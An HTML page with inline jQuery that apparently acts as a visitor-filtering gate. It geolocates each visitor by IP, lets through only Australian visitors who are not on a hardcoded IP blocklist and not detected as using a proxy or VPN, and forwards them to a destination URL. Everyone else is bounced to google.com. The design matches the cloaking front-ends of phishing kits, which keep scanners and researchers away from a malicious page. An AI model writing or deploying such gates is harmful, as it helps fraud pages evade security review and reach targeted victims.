<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check Access</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js"></script>

    <script>
        const allowedCountry = 'AU'; // السماح فقط لأستراليا
        const proxyCheckAPI = "https://proxycheck.io/v2/";
        const blockedIPs = [
            "185.18.222.147",
            "103.17.196.155",
            "198.44.133.53",
            "138.199.22.183",
            "106.161.65.206",
            "54.200.5.221",
            "35.89.14.236",
            "35.88.70.185"
        ];

        function redirectTo(url) {
            setTimeout(() => {
                window.location.href = url;
            }, 1000); // تأخير 1 ثانية لضمان عدم التعليق
        }

        $.get('https://ipinfo.io/json', function(data) {  
            const userIP = data.ip;
            const userCountry = data.country;

            console.log("User IP:", userIP);
            console.log("User Country:", userCountry);

            if (blockedIPs.includes(userIP)) {
                console.log("Access denied: IP is blacklisted");
                redirectTo("https://google.com");
                return;
            }

            if (userCountry !== allowedCountry) {
                console.log("Access denied: Not from AU");
                redirectTo("https://google.com");
                return;
            }

            $.get(`${proxyCheckAPI}${userIP}?key=YOUR_API_KEY&vpn=1&asn=1`, function(response) {
                if (response[userIP] && response[userIP].proxy === "yes") {
                    console.log("Access denied: Proxy/VPN detected");
                    redirectTo("https://google.com");
                } else {
                    console.log("Access granted!");
                    redirectTo("https://ovh.com");
                }
            }).fail(function() {
                console.log("Failed to check VPN, redirecting...");
                redirectTo("https://google.com");
            });

        }).fail(function() {  
            console.error('Error retrieving IP info, redirecting...');
            redirectTo("https://google.com");
        });

    </script>
</head>
<body>
</body>
</html>
